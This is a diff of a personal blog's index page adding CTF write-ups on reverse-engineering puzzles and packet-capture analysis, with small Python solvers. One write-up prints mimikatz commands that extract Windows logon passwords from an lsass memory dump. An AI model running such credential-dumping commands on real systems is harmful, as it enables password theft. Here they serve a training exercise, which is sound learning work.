@@ -150,18 +150,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives">
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories">
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags">
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -178,6 +178,293 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://li1x.github.io/CTF/Re/Re%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Li1x">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Li1x's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Li1x's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/CTF/Re/Re%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">Re刷题记录</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-04-04 20:53:22" itemprop="dateCreated datePublished" datetime="2024-04-04T20:53:22+08:00">2024-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-04-08 00:54:31" itemprop="dateModified" datetime="2024-04-08T00:54:31+08:00">2024-04-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Reverse/" itemprop="url" rel="index"><span itemprop="name">Reverse</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/CTF/Re/Re%E8%AE%B0%E5%BD%95/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="CTF/Re/Re记录/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>3k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>5 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="Buu-新年快乐-初用upx"><a href="#Buu-新年快乐-初用upx" class="headerlink" title="Buu - 新年快乐 [ 初用upx ]"></a>Buu - 新年快乐 [ 初用upx ]</h2><p>32位有壳</p>
+<p><img src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-4-00.png"></p>
+<blockquote>
+<p>加壳 upx.exe filename</p>
+<p>脱壳 upx.exe -d filename</p>
+</blockquote>
+<p><strong>在upx目录下打开终端，将软件放在相同目录（或者直接给出绝对路径）</strong></p>
+<p>脱完壳之后用32位ida打开，进入main函数，</p>
+<p><img src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-4-01.png"></p>
+<p>str2就是flag</p>
+<h2 id="Buu-xor-ida运用"><a href="#Buu-xor-ida运用" class="headerlink" title="Buu - xor [ ida运用 ]"></a>Buu - xor [ ida运用 ]</h2><p>查壳，无壳，拖进64位ida（我是在linux中file命令看的位）</p>
+<p><img src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-00.png"></p>
+<blockquote>
+<p>这是main函数，先看到</p>
+<p> if ( !strncmp(__b, global, 33uLL) )<br>    printf(“Success”);</p>
+<p>要success &#x3D;&gt; __b &#x3D;&#x3D; global 前33位相等</p>
+</blockquote>
+<blockquote>
+<p>全部分析一遍，先给__b 256字节置0 -&gt; 调用get_line函数 -&gt; 输入__b -&gt; __b字符串的长度只能是33 -&gt; 然后是for循环，一个异或</p>
+<p>-&gt; 最后比较，前33位要相等</p>
+</blockquote>
+<p><strong>Result</strong>： global[i] &#x3D; b[i] ^ b[i-1]，我们要求的是__b的值（前面的printf语句，input your flag），可以看出长度为33（如果不是33，直接goto LABEL_7 &#x3D;&gt; return语句）</p>
+<p><strong>Skill</strong>：点击global查看它的值，跳转到上面这个图中，看到灰色的部分（我奇怪的是，与Wp中看到的值不一样，我就随便双击了一下灰色部分，发现依然可以跳转），然后就来到了下面这个图的部分</p>
+<p><img src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-01.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shift + e =&gt; 提取数组中的字符</span><br></pre></td></tr></table></figure>
+
+<p><img src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-02.png" alt="4-5-02"></p>
+<p>脚本异或一下得到__b的值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">  <span class="number">102</span>,  <span class="number">10</span>, <span class="number">107</span>,  <span class="number">12</span>, <span class="number">119</span>,  <span class="number">38</span>,  <span class="number">79</span>,  <span class="number">46</span>,  <span class="number">64</span>,  <span class="number">17</span>,</span><br><span class="line">  <span class="number">120</span>,  <span class="number">13</span>,  <span class="number">90</span>,  <span class="number">59</span>,  <span class="number">85</span>,  <span class="number">17</span>, <span class="number">112</span>,  <span class="number">25</span>,  <span class="number">70</span>,  <span class="number">31</span>,</span><br><span class="line">  <span class="number">118</span>,  <span class="number">34</span>,  <span class="number">77</span>,  <span class="number">35</span>,  <span class="number">68</span>,  <span class="number">14</span>, <span class="number">103</span>,   <span class="number">6</span>, <span class="number">104</span>,  <span class="number">15</span>,</span><br><span class="line">   <span class="number">71</span>,  <span class="number">50</span>,  <span class="number">79</span>,  <span class="number">0</span></span><br><span class="line">]</span><br><span class="line">x = <span class="string">&quot;f&quot;</span>  <span class="comment"># for循环是从1开始的</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(data)):</span><br><span class="line">    x += <span class="built_in">chr</span>(data[i]^data[i-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Buu-reverse3-base64加密函数"><a href="#Buu-reverse3-base64加密函数" class="headerlink" title="Buu - reverse3 [ base64加密函数 ]"></a>Buu - reverse3 [ base64加密函数 ]</h2><p>32位无壳，拖进ida32位中，找到main_0函数</p>
+<p><img src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-03.png"></p>
+<p>输入字符串 Str -&gt; 经过sub_4110BE函数之后赋值给v4 -&gt; 将v4前40位字符给Destination -&gt; 遍历Destination字符串 每一个加上下表-&gt; 比较Destination 和 Str2是否相同</p>
+<blockquote>
+<p>sub_4110BE函数</p>
+</blockquote>
+<p><img src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-04.png"></p>
+<p>-&gt; 下面这是一个base64加密的过程（Wp）</p>
+<p><strong>Result：</strong>可以查看Str2字符串值（追踪Str2），推出来输入的值（先base64加密 后每一位加上下标）</p>
+<p><img src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-05.png"></p>
+<p><strong>payload：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = <span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span></span><br><span class="line">str1 = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    str1 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(data[i]) - i)</span><br><span class="line">flag = base64.b64decode(str1)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Buu-不一样的flag-迷宫题"><a href="#Buu-不一样的flag-迷宫题" class="headerlink" title="Buu - 不一样的flag [ 迷宫题 ]"></a>Buu - 不一样的flag [ 迷宫题 ]</h2><p>32位无壳，用ida打开，看到一串数字和上下左右（猜测是迷宫题）</p>
+<p><img src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-00.png"></p>
+<p><img src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-01.png"></p>
+<p>选中 <code>&#39;49&#39;</code>换成字符 -&gt; R键将Ascii换成对应字符</p>
+<p>-&gt; 如果是1 就退出</p>
+<p>-&gt; 如果是# 你输入的序列就是flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*1111</span><br><span class="line">01000</span><br><span class="line">01010</span><br><span class="line">00010</span><br><span class="line">1111#</span><br><span class="line">下下下右右上上右右下下下</span><br><span class="line">222441144222</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>5*5列，从*开始，1,2,3,4对应上下左右 走到#</p>
+</blockquote>
+<h2 id="Buu-SimpleRev-字节序-真是逆向了"><a href="#Buu-SimpleRev-字节序-真是逆向了" class="headerlink" title="Buu - SimpleRev [ 字节序 真是逆向了 ]"></a>Buu - SimpleRev [ 字节序 真是逆向了 ]</h2><p>字节的排列方式有两个通用规则： <a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2022/06/endianness-analysis.html">学习了解字节序00</a>                    <a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2016/11/byte-order.html">学习了解字节序01</a></p>
+<p><strong>大端序</strong> - 数据的低位字节放在内存的高位地址，高位字节存放在低位地址</p>
+<p><strong>小端序</strong> - 低位放在低地址，高位放在高地址</p>
+<p><strong>CPU读取内存中的数据时，是从低地址向高地址方向进行读取的</strong></p>
+<p><img src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-02.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i ) <span class="comment">// v5是key的长度</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; key[v3 % v5] &lt;= <span class="string">&#x27;Z&#x27;</span> ) <span class="comment">// 判断key中的每个元素是不是大写字母</span></span><br><span class="line">    key[i] = key[v3 % v5] + <span class="number">32</span>;	<span class="comment">// 如果是，将那一位 加上32 =&gt; 变成对应的小写字母</span></span><br><span class="line">  ++v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )	<span class="comment">// 小写字母范围</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> ) <span class="comment">// 大写字母范围</span></span><br><span class="line">    &#123;</span><br><span class="line">      str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>; <span class="comment">// 下面这些就有点懵逼了了</span></span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">  ++v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>还要对Ascii码熟悉点</p>
+</blockquote>
+<p><img src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-03.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&quot;killshadow&quot;</span></span><br><span class="line">key = <span class="string">&quot;adsfkndcls&quot;</span></span><br><span class="line">dic = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>((<span class="built_in">ord</span>(j) - <span class="number">39</span> - <span class="built_in">ord</span>(key[i]) + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>) == text[i]:</span><br><span class="line">            flag += j</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<h2 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        s = <span class="number">9180147350284624745LL</span>;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>case4：将s字符串赋值给f2</p>
+<p>case5：对于f2字符串，如果是奇数位 -2；如果是偶数位 -1</p>
+<p>case1：f1已知，f2是上面得到的，两个拼接 就是s</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">f1 = <span class="string">&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x7f</span>, <span class="number">0x66</span>, <span class="number">0x6f</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>] <span class="comment">#逆序 [ 字节序 小端序 ]</span></span><br><span class="line"><span class="comment"># 0x7F666F6067756369</span></span><br><span class="line">flag = f1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(key)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(key[i] - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(key[i] - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://li1x.github.io/CTF/Web/xyctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Li1x">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Li1x's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Li1x's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/CTF/Web/xyctf/" class="post-title-link" itemprop="url">Untitled</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-04-01 20:05:38" itemprop="dateCreated datePublished" datetime="2024-04-01T20:05:38+08:00">2024-04-01</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/CTF/Web/xyctf/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="CTF/Web/xyctf/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>0</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>1 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -215,9 +502,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2024-04-01 00:13:08 / Modified: 00:22:24" itemprop="dateCreated datePublished" datetime="2024-04-01T00:13:08+08:00">2024-04-01</time>
+      <time title="Created: 2024-04-01 00:13:08" itemprop="dateCreated datePublished" datetime="2024-04-01T00:13:08+08:00">2024-04-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-04-08 00:44:12" itemprop="dateModified" datetime="2024-04-08T00:44:12+08:00">2024-04-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -250,14 +543,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>178</span>
+      <span>9.7k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>1 mins.</span>
+      <span>18 mins.</span>
     </span>
 </div>
 
@@ -277,6 +570,169 @@
 <p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-1-02.png"></p>
 <h3 id="过滤器知识点："><a href="#过滤器知识点：" class="headerlink" title="过滤器知识点："></a>过滤器知识点：</h3><p><code>http contains &#39;flag&#39;</code></p>
 <p>-&gt; 匹配http协议的 且 流量包中含有flag字符的</p>
+<hr>
+<h2 id="安洵杯-2019-Attack-压缩包"><a href="#安洵杯-2019-Attack-压缩包" class="headerlink" title="[安洵杯 2019]Attack [ 压缩包 ]"></a>[安洵杯 2019]Attack [ 压缩包 ]</h2><p>用wireshark打开，过滤器语句<code> http contains &quot;flag&quot;</code>看看有没有结果：</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-00.png"></p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-01.png"></p>
+<p>有结果肯定要追踪http流，（我自己做的时候只关注到了flag.txt）却没关注到 PK（zip压缩包的标志）</p>
+<p><del>我的第一想法肯定要将它给拿出来进行分离zip获得flag.txt的</del></p>
+<p>但看了Wp：直接分离这个流量包（附件）即可：用kali中的工具<code>foremost -T Attack.pcap</code></p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-03.png"></p>
+<p>获得zip压缩包，但是有加密，这个压缩包的 属性 -&gt; 注释  中提示信息，指向了管理员的密码</p>
+<p>哪里获取管理员密码呢，看Wp说是 dmp文件</p>
+<blockquote>
+<p>dmp后缀文件是windows系统中的错误转储文件，当windows发生错误蓝屏的时候，系统将当前内存[含虚拟内存]中数据直接写到这类文件中去，方便定位故障原因。 里面包含了主机用户密码信息</p>
+</blockquote>
+<p>经过过滤器，发现是有dmp的信息的 [ 之后感觉我这个过滤语句不太好，dmp只是三个字符而已，有可能出现偶尔情况，加个. ] [我不知道通配符是什么，我试了 <code>*.dmp</code> 没结果]</p>
+<p>发现有，就导出</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-05.png"></p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-02.png"></p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-04.png"></p>
+<p>接下来需要用到工具 <code>mimikatz</code> 下载链接</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919</a></p>
+<p>具体用法我也不知道。关于这个题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//提升权限</span><br><span class="line">privilege::debug</span><br><span class="line">//载入dmp文件</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">//读取登陆密码</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
+
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-06.png" alt="4-2-06"></p>
+<p>我不知道为什么 我输入提升权限的那句代码会报错，</p>
+<p>但是输入后面的代码正常运行。</p>
+<p>然后就会看到密码了。Password：</p>
+<h2 id="NewStarCTF-公开赛赛道-最后的流量分析-tshark"><a href="#NewStarCTF-公开赛赛道-最后的流量分析-tshark" class="headerlink" title="[NewStarCTF 公开赛赛道]最后的流量分析 [ tshark ]"></a>[NewStarCTF 公开赛赛道]最后的流量分析 [ tshark ]</h2><p><a target="_blank" rel="noopener" href="http://linux.51yip.com/search/tshark">tshark的使用</a></p>
+<p><code>tshark -r sqli.pcap -T fields -Y &quot;http.request.method==GET or frame.len&gt;765&quot; -e &quot;frame.len&quot; -e &quot;http.request.uri.query.parameter&quot; &gt; data.txt</code></p>
+<blockquote>
+<p>-r 解析的流量文件</p>
+<p>-T 指定输出的格式，fields &#x3D;&gt; 只输出符合条件的字段</p>
+<p>-Y 用于过滤流量包 &#x3D;&gt; 上面的-Y表示 只取GET方法的或者流量包长度大于765的</p>
+<p>-e 要输出的字段 &#x3D;&gt; 上面的-e表示 输出流量包长度以及流量包中uri中的参数</p>
+<p>&gt; 重定向，这里表示将输出的东西 重定向到一个data.txt文件内</p>
+</blockquote>
+<p>第一次用这个tshark 看手册吧.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">comment = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\CTF\data.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	lines = f.readlines() <span class="comment"># 读取txt文件中的每一行</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lines)):	<span class="comment"># len(lines)-&gt;读取的行数</span></span><br><span class="line">		<span class="comment"># print(lines[i])</span></span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">int</span>(lines[i][:<span class="number">3</span>])&gt;<span class="number">765</span>:</span><br><span class="line">			comment += re.findall(<span class="string">r&#x27;&quot;(.)&quot;&#x27;</span>, unquote(lines[i-<span class="number">1</span>]))[<span class="number">0</span>]	<span class="comment"># 观察得到的txt文本，当出现&gt;768的行数，上一行双引号中的内容就是flag的值 =&gt; 正是因为我们观察到了这个，才通过python来得到这个内容</span></span><br><span class="line"><span class="comment"># unquote -&gt; 解码url编码的字符串</span></span><br><span class="line"><span class="comment"># r&#x27;&#x27; -&gt; 将转义字符当做普通字符</span></span><br><span class="line"><span class="comment"># . 通配符</span></span><br><span class="line"><span class="built_in">print</span>(comment)</span><br></pre></td></tr></table></figure>
+
